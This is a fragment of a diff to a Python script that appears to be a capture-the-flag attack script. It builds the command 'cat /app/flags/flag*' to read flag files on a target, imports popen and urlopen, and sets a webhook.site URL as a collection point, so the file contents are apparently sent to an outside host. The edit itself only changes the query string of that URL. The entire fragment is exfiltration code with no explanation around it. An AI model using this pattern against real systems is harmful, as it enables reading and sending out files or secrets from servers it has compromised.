@@ -2,7 +2,7 @@ from os import popen
 from urllib.request import urlopen
 
 token = "TomorinIsCuteAndILovePython" 
-url = "https://webhook.site/111d99e4-8095-4b6a-bf04-e4a79209bce2/?flag="
+url = "https://webhook.site/111d99e4-8095-4b6a-bf04-e4a79209bce2/"
 
 cmd2 = lambda a: "cat /app/flags/flag*"
 func2 = lambda f: [x[:-1] for x in f][0]
